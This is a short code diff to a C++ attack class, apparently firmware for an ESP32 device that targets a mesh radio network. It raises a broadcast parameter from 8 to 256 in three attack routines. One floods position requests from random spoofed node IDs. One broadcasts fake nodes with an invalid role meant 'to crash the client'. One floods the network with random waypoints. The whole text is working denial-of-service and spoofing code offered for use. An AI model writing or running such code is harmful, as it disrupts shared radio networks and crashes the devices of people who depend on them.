@@ -81,7 +81,7 @@ void TMAttack::atkNameChange() {
 
 void TMAttack::atkDdos() {
     uint32_t srcnode = esp_random();
-    mtCompact->sendRequestPositionInfo(0xffffffff, 8, srcnode);
+    mtCompact->sendRequestPositionInfo(0xffffffff, 256, srcnode);
     sendDebugMessage("Sent DDOS msg 1 request from 0x" + std::to_string(srcnode));
     srcnode = getRandomTarget();
     if (srcnode == 0) {
@@ -181,9 +181,9 @@ void TMAttack::atkRndNode() {
         nodeinfo.role = 20;  // invalid role to crash the client
     }
     mtCompact->sendNodeInfo(nodeinfo, 0xffffffff, false);
-    mtCompact->sendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
+    mtCompact->sendPositionMessage(pos_msg, 0xffffffff, 256, srcnode);
     mtCompact->sendNodeInfo(nodeinfo, 0xffffffff, false);
-    mtCompact->sendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
+    mtCompact->sendPositionMessage(pos_msg, 0xffffffff, 256, srcnode);
     sendDebugMessage("Sent fake node 0x" + std::to_string(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
 }
 
@@ -205,7 +205,7 @@ void TMAttack::atkWaypointFlood() {
     float longitude = min_lon + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lon - min_lon)));
     uint32_t wpnum = esp_random();
     MtCompactHelpers::WaypointBuilder(waypoint, esp_random(), latitude, longitude, "WP-" + std::to_string(wpnum), "WP-" + std::to_string(wpnum), expire, icon);
-    mtCompact->sendWaypointMessage(waypoint, 0xffffffff, 8, srcnode);
+    mtCompact->sendWaypointMessage(waypoint, 0xffffffff, 256, srcnode);
     sendDebugMessage("Sent waypoint from node 0x" + std::to_string(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
 }
 
